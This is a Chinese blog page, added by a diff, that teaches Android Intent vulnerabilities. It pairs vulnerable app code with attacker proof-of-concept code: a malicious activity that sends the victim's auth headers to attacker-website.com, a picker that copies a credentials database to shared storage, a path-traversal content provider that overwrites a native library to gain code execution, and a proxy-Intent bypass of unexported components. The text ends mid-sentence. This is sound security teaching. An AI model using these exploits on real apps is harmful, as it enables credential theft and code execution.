@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="tea9">
+
+
+    <meta name="subtitle" content="加油">
+
+
+    <meta name="description" content="心中有光の孩子 提示：图片都存到了github仓库需要挂代理才能看到">
+
+
+    <meta name="keywords" content="tea9,tea9的博客,开发,android,安全,android安全,android逆向,移动安全,frida,xposed,ollvm,查查查,茶茶茶,茶茶,茶姐姐,茶姐姐博客,茶茶茶博客,茶茶blog">
+
+
+<title>Android Intent漏洞 | tea9のblog</title>
+
+
+
+    <link rel="icon" href="/image/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Tea9&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Tea9&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Android Intent漏洞</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">tea9</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">四月 28, 2023&nbsp;&nbsp;21:23:23</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Security/">Security</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="Intent漏洞"><a href="#Intent漏洞" class="headerlink" title="Intent漏洞"></a>Intent漏洞</h1><h2 id="1-Intent-类型"><a href="#1-Intent-类型" class="headerlink" title="1.Intent 类型"></a>1.Intent 类型</h2><p><strong>显示Intent</strong></p>
+<p>显式Intent通过提供目标应用的包名称或完全限定的组件类名来指定哪个应用程序将满足意向。</p>
+<p>即需要明确组件类名。如</p>
+<p>例如，如果你在应用中构建一个名为DownloadService的服务，用于从Web下载文件，可以使用以下代码启动：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// Executed in an Activity, so &#x27;this&#x27; is the Context</span><br><span class="line">// The fileUrl is a string URL, such as &quot;http://www.example.com/image.png&quot;</span><br><span class="line">Intent downloadIntent = new Intent(this, DownloadService.class);</span><br><span class="line">downloadIntent.setData(Uri.parse(fileUrl));</span><br><span class="line">startService(downloadIntent);</span><br></pre></td></tr></table></figure>
+
+<p><strong>隐示Intent</strong></p>
+<p>不会指定特定的组件，而是声明要执行的常规操作，从而允许其他应用中的组件来处理。例如，如需在地图上向用户显示位置，则可以使用隐式 Intent，请求另一具有此功能的应用共享内容</p>
+<p>例如，如果希望与其他人共享的内容，可以使用 ACTION_SEND 操作创建 Intent，并添加指定要共享的内容。则可以使用隐式 Intent调用startActivity()，请求另一具有此功能的应用共享内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// Create the text message with a string.</span><br><span class="line">Intent sendIntent = new Intent();</span><br><span class="line">sendIntent.setAction(Intent.ACTION_SEND);</span><br><span class="line">sendIntent.putExtra(Intent.EXTRA_TEXT, textMessage);//分享的内容</span><br><span class="line">sendIntent.setType(&quot;text/plain&quot;);//分享的是文本类型</span><br><span class="line"></span><br><span class="line">// Try to invoke the intent.</span><br><span class="line">try &#123;</span><br><span class="line">    startActivity(sendIntent);</span><br><span class="line">&#125; catch (ActivityNotFoundException e) &#123;</span><br><span class="line">    // Define what your app should do if no activity can handle the intent.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其他应用接受文本内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity android:name=&quot;.ui.MyActivity&quot; &gt;</span><br><span class="line">     &lt;intent-filter&gt;</span><br><span class="line">         &lt;action android:name=&quot;android.intent.action.SEND&quot; /&gt;</span><br><span class="line">         &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;</span><br><span class="line">         &lt;data android:mimeType=&quot;text/plain&quot; /&gt;</span><br><span class="line">     &lt;/intent-filter&gt;</span><br><span class="line"> &lt;/activity&gt;</span><br></pre></td></tr></table></figure>
+
+<p>处理传入的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">void onCreate (Bundle savedInstanceState) &#123;</span><br><span class="line">    ...</span><br><span class="line">    // Get intent, action and MIME type</span><br><span class="line">    Intent intent = getIntent();</span><br><span class="line">    String action = intent.getAction();</span><br><span class="line">    String type = intent.getType();</span><br><span class="line"></span><br><span class="line">    if (Intent.ACTION_SEND.equals(action) &amp;&amp; type != null) &#123;</span><br><span class="line">        if (&quot;text/plain&quot;.equals(type)) &#123;</span><br><span class="line">            handleSendText(intent); // Handle text being sent</span><br><span class="line">        &#125; </span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // Handle other intents, such as being started from the home screen</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void handleSendText(Intent intent) &#123;</span><br><span class="line">    String sharedText = intent.getStringExtra(Intent.EXTRA_TEXT);</span><br><span class="line">    if (sharedText != null) &#123;</span><br><span class="line">        // Update UI to reflect text being shared</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>您可以使用 <code>android:priority=&quot;num&quot;</code> 属性在 Intent 过滤器中控制应用在列表中的位置 </p>
+<h2 id="2-安全问题"><a href="#2-安全问题" class="headerlink" title="2.安全问题"></a>2.安全问题</h2><h3 id="滥用Activity返回值"><a href="#滥用Activity返回值" class="headerlink" title="滥用Activity返回值"></a>滥用Activity返回值</h3><p>如果受害应用使用startActivityForResult()，攻击应用使用setResult()将数据传输到受害者应用的onActivityResult()中，基于onActivityResulty()中具体的实现产生具体攻击。</p>
+<p>通常有两种攻击操作：</p>
+<ul>
+<li>通常导致读入任意文件</li>
+<li>自定义操作，取决于应用程序实现产生的不同漏洞</li>
+</ul>
+<p><strong>自定义操作</strong></p>
+<p>受害者应用代码：功能需要接受返回数据并在webview中打开,接收返回码为1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">startActivityForResult(new Intent(&quot;com.victim.PICK_ARTICLE&quot;), 1);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">protected void onActivityResult(int requestCode, int resultCode, Intent data) &#123;</span><br><span class="line">    super.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">    if(requestCode == 1 &amp;&amp; resultCode == -1) &#123;</span><br><span class="line">        webView.loadUrl(data.getStringExtra(&quot;picked_url&quot;), getAuthHeaders());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者应用代码：处理com.victim.PICK_ARTICLE操作，并传递危险url给受害者应用</p>
+<p>AndroidManifest.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity android:name=&quot;.EvilActivity&quot;&gt;</span><br><span class="line">    &lt;intent-filter android:priority=&quot;999&quot;&gt;</span><br><span class="line">        &lt;action android:name=&quot;com.victim.PICK_ARTICLE&quot; /&gt;</span><br><span class="line">        &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;</span><br><span class="line">    &lt;/intent-filter&gt;</span><br><span class="line">&lt;/activity&gt;</span><br></pre></td></tr></table></figure>
+
+<p>EvilActivity.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">    super.onCreate(savedInstanceState);</span><br><span class="line">    setResult(-1, new Intent().putExtra(&quot;picked_url&quot;, &quot;https://attacker-website.com/&quot;));</span><br><span class="line">    finish();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击链：</p>
+<p>打开攻击应用传输攻击链接给受害者应用-受害者应用打开攻击链接</p>
+<p><strong>系统操作</strong></p>
+<p>标准的android操作</p>
+<p><code>android.intent.action.PICK</code> 选择图片</p>
+<p><code>android.intent.action.GET_CONTENT</code> 选择文件</p>
+<p><code>android.media.action.IMAGE_CAPTURE</code> 创建图片</p>
+<p>etc.</p>
+<p>用于获取用户选择的文件（文档、图象、视频）的URI，并在应用中进行处理（例如，将文件发送到服务器中），大多Android&#x2F;Java无法将Android ContentResolver返回的InputSteam数据发送到服务器中。所以应用在处理文件之前会把URI缓存到文件中。这可能导致读取&#x2F;写入任意文件。</p>
+<p><strong>任意文件读取</strong></p>
+<p>假设应用获取URI并将文件换从到外部目录（例如SD卡），易受攻击的应用代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">    super.onCreate(savedInstanceState);</span><br><span class="line">    startActivityForResult(new Intent(Intent.ACTION_PICK), 1337);</span><br><span class="line">&#125;</span><br><span class="line">protected void onActivityResult(int requestCode, int resultCode, Intent data) &#123;</span><br><span class="line">    super.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">    if(requestCode != 1337 || resultCode != -1 || data == null || data.getData() == null) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    Uri pickedUri = data.getData();</span><br><span class="line">    File cacheFile = new File(getExternalCacheDir(), &quot;temp&quot;);</span><br><span class="line">    copy(pickedUri, cacheFile);</span><br><span class="line">    </span><br><span class="line">    // the file is then processed in some way</span><br><span class="line">&#125;</span><br><span class="line">private void copy(Uri uri, File toFile) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        InputStream inputStream = getContentResolver().openInputStream(uri);</span><br><span class="line">        OutputStream outputStream = new FileOutputStream(toFile);</span><br><span class="line">        copy(inputStream, outputStream);</span><br><span class="line">    &#125;</span><br><span class="line">    catch (Throwable th) &#123;</span><br><span class="line">        // error handling</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public static void copy(InputStream inputStream, OutputStream outputStream) throws IOException &#123;</span><br><span class="line">    byte[] bArr = new byte[65536];</span><br><span class="line">    while (true) &#123;</span><br><span class="line">        int read = inputStream.read(bArr);</span><br><span class="line">        if (read == -1) &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        outputStream.write(bArr, 0, read);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这种情况下，可以创建一个应用，应用将返回指向目标应用的专用目录中的文件链接：</p>
+<p>攻击应用代码：</p>
+<p>AndroidManifest.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity android:name=&quot;.PickerActivity&quot;&gt;</span><br><span class="line">    &lt;intent-filter android:priority=&quot;999&quot;&gt;</span><br><span class="line">        &lt;action android:name=&quot;android.intent.action.PICK&quot; /&gt;</span><br><span class="line">        &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;</span><br><span class="line">        &lt;data android:mimeType=&quot;*/*&quot; /&gt;</span><br><span class="line">        &lt;data android:mimeType=&quot;image/*&quot; /&gt;</span><br><span class="line">    &lt;/intent-filter&gt;</span><br><span class="line">&lt;/activity&gt;</span><br></pre></td></tr></table></figure>
+
+<p>PickerActivity.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">    super.onCreate(savedInstanceState);</span><br><span class="line">    setResult(-1, new Intent().setData(Uri.parse(&quot;file:///data/data/com.victim/databases/credentials&quot;)));</span><br><span class="line">    finish();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>打开当受害者应用选择点击攻击者应用时，&#x2F;data&#x2F;data&#x2F;com.victim&#x2F;databases&#x2F;credentials文件会自动复制到SD卡上，并且任何应用具有android.permission.READ_EXTERNAL_STORAGE权限都可以进行读取该文件。</p>
+<p><strong>任意文件写入</strong></p>
+<p>假设应用获取Content URI 并将文件从ContentProvider缓存到临时目录，则易受攻击的应用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">    super.onCreate(savedInstanceState);</span><br><span class="line">    startActivityForResult(new Intent(Intent.ACTION_PICK), 1337);</span><br><span class="line">&#125;</span><br><span class="line">protected void onActivityResult(int requestCode, int resultCode, Intent data) &#123;</span><br><span class="line">    super.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">    if(requestCode != 1337 || resultCode != -1 || data == null || data.getData() == null) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    Uri pickedUri = data.getData();</span><br><span class="line">    File pickedFile;</span><br><span class="line">    if(&quot;file&quot;.equals(pickedUri.getScheme())) &#123;</span><br><span class="line">        pickedFile = new File(pickedUri.getPath());</span><br><span class="line">    &#125;</span><br><span class="line">    else if(&quot;content&quot;.equals(pickedUri.getScheme())) &#123;</span><br><span class="line">        pickedFile = new File(getCacheDir(), getFileName(pickedUri));</span><br><span class="line">        copy(pickedUri, pickedFile);</span><br><span class="line">    &#125;</span><br><span class="line">    // do something with the file</span><br><span class="line">&#125;</span><br><span class="line">private String getFileName(Uri pickedUri) &#123;</span><br><span class="line">    Cursor cursor = getContentResolver().query(pickedUri, new String[]&#123;MediaStore.MediaColumns.DISPLAY_NAME&#125;, null, null, null);</span><br><span class="line">    if(cursor != null &amp;&amp; cursor.moveToFirst()) &#123;</span><br><span class="line">        String displayName = cursor.getString(cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME));</span><br><span class="line">        if(displayName != null) &#123;</span><br><span class="line">            return displayName;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return &quot;temp&quot;;</span><br><span class="line">&#125;</span><br><span class="line">private void copy(Uri uri, File toFile) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        InputStream inputStream = getContentResolver().openInputStream(uri);</span><br><span class="line">        OutputStream outputStream = new FileOutputStream(toFile);</span><br><span class="line">        copy(inputStream, outputStream);</span><br><span class="line">    &#125;</span><br><span class="line">    catch (Throwable th) &#123;</span><br><span class="line">        // error handling</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public static void copy(InputStream inputStream, OutputStream outputStream) throws IOException &#123;</span><br><span class="line">    byte[] bArr = new byte[65536];</span><br><span class="line">    while (true) &#123;</span><br><span class="line">        int read = inputStream.read(bArr);</span><br><span class="line">        if (read == -1) &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        outputStream.write(bArr, 0, read);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以使用ContentProvider，将带有路径遍历的名称传递给getFileName()方法，攻击者应用：</p>
+<p>AndroidManifest.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity android:name=&quot;.PickerActivity&quot;&gt;</span><br><span class="line">    &lt;intent-filter android:priority=&quot;999&quot;&gt;</span><br><span class="line">        &lt;action android:name=&quot;android.intent.action.PICK&quot; /&gt;</span><br><span class="line">        &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;</span><br><span class="line">        &lt;data android:mimeType=&quot;*/*&quot; /&gt;</span><br><span class="line">        &lt;data android:mimeType=&quot;image/*&quot; /&gt;</span><br><span class="line">    &lt;/intent-filter&gt;</span><br><span class="line">&lt;/activity&gt;</span><br><span class="line">&lt;provider android:name=&quot;.EvilContentProvider&quot; </span><br><span class="line">    android:authorities=&quot;com.attacker.evil&quot;</span><br><span class="line">    android:enabled=&quot;true&quot;</span><br><span class="line">    android:exported=&quot;true&quot;&gt;</span><br><span class="line">&lt;/provider&gt;</span><br></pre></td></tr></table></figure>
+
+<p>EvilContentProvider.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) &#123;</span><br><span class="line">    MatrixCursor matrixCursor = new MatrixCursor(new String[]&#123;&quot;_display_name&quot;&#125;);</span><br><span class="line">    matrixCursor.addRow(new Object[]&#123;&quot;../lib-main/lib.so&quot;&#125;);</span><br><span class="line">    return matrixCursor;</span><br><span class="line">&#125;</span><br><span class="line">public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException &#123;</span><br><span class="line">    return ParcelFileDescriptor.open(</span><br><span class="line">        new File(&quot;/data/data/com.attacker/fakelib.so&quot;), </span><br><span class="line">        ParcelFileDescriptor.MODE_READ_ONLY</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面代码可以绕过&#x2F;data&#x2F;data&#x2F;com.victim&#x2F;cache&#x2F;目录边界，并将文件写入</p>
+<p>&#x2F;data&#x2F;data&#x2F;com.victim&#x2F;lib-main&#x2F;lib.so如果目标应用加载此so，则会导致受害者Context任意代码执行</p>
+<p>我理解的是启动受害者应用会调起攻击者应用然后利用路径遍历，然后替换原有的lib.so,造成任意代码执行，可以在攻击lib.so中加载恶意代码执行。ps：上面是我的理解，不知道对不对</p>
+<h3 id="访问任意组件"><a href="#访问任意组件" class="headerlink" title="访问任意组件"></a>访问任意组件</h3><p>由于 Intent 是 <code>Parcelable</code>，因此属于此类的对象可以作为额外数据传递给另一个 Intent。这可用于创建一个代理组件（活动、广播接收器或服务），该组件采用嵌入式意图并将其传递给危险方法，如startActivity()或 sendBroadcast()因此，可以强制应用启动无法直接从其他应用启动的未导出组件，或授予自己对应用内容提供商的访问权限。</p>
+<p>例如，假设应用具有执行某些不安全操作的未导出活动以及用作代理的导出活动：</p>
+<p>AndroidManifest.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity android:name=&quot;.ProxyActivity&quot; android:exported=&quot;true&quot; /&gt;</span><br><span class="line">&lt;activity android:name=&quot;.AuthWebViewActivity&quot; android:exported=&quot;false&quot; /&gt;</span><br></pre></td></tr></table></figure>
+
+<p>ProxyActivity.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">startActivity((Intent) getIntent().getParcelableExtra(&quot;extra_intent&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>AuthWebViewActivity.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webView.loadUrl(getIntent().getStringExtra(&quot;url&quot;), getAuthHeaders());</span><br></pre></td></tr></table></figure>
+
+<p>在此示例中，<code>AuthWebViewActivity</code> 将用户身份验证会话传递到从 url 参数获取的 URL。</p>
+<p>导出限制意味着您无法直接访问 AuthWebViewActivity，并且直接调用会抛出 java.lang.SecurityException，并拒绝权限：AuthWebViewActivity 未从 uid 1337 消息导出：<br>可以通过ProxyActivity进行访问AuthWebViewActivity</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = new Intent();</span><br><span class="line">intent.setClassName(&quot;com.victim&quot;, &quot;com.victim.AuthWebViewActivity&quot;);</span><br><span class="line">intent.putExtra(&quot;url&quot;, &quot;http://attacker-website.com/&quot;);</span><br><span class="line">// throws java.lang.SecurityException</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
+
+<p>但是，您可以强制受害者自行启动<code>AuthWebViewActivity</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Intent extra = new Intent();</span><br><span class="line">extra.setClassName(&quot;com.victim&quot;, &quot;com.victim.AuthWebViewActivity&quot;);</span><br><span class="line">extra.putExtra(&quot;url&quot;, &quot;http://attacker-website.com/&quot;);</span><br><span class="line"></span><br><span class="line">Intent intent = new Intent();</span><br><span class="line">intent.setClassName(&quot;com.victim&quot;, &quot;com.victim.ProxyActivity&quot;);</span><br><span class="line">intent.putExtra(&quot;extra_intent&quot;, extra);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
+
+<p>没有安全违规，因为应用可以访问自己的所有组件。因此，它允许您绕过Android的内置限制。</p>
+<p>就其本身而言，启动隐藏组件不会产生太大的安全影响，并且需要滥用隐藏组件的功能：</p>
+<p><strong>旁路保护</strong></p>
+<p>开发人员可以实现对收到的意图的过滤和<a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/content/Intent#setComponent(android.content.ComponentName)">显式设置组件以处理意图</a> 为<code>null</code>：</p>
+<p>intent.setComponent(null);&#x2F;&#x2F;null 让系统为您找到一个</p>
+<p>在这种情况下，可以通过指定未导出的组件来绕过应用的显式意图保护<a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/content/Intent#setSelector(android.content.Intent)">选择器</a>:</p>
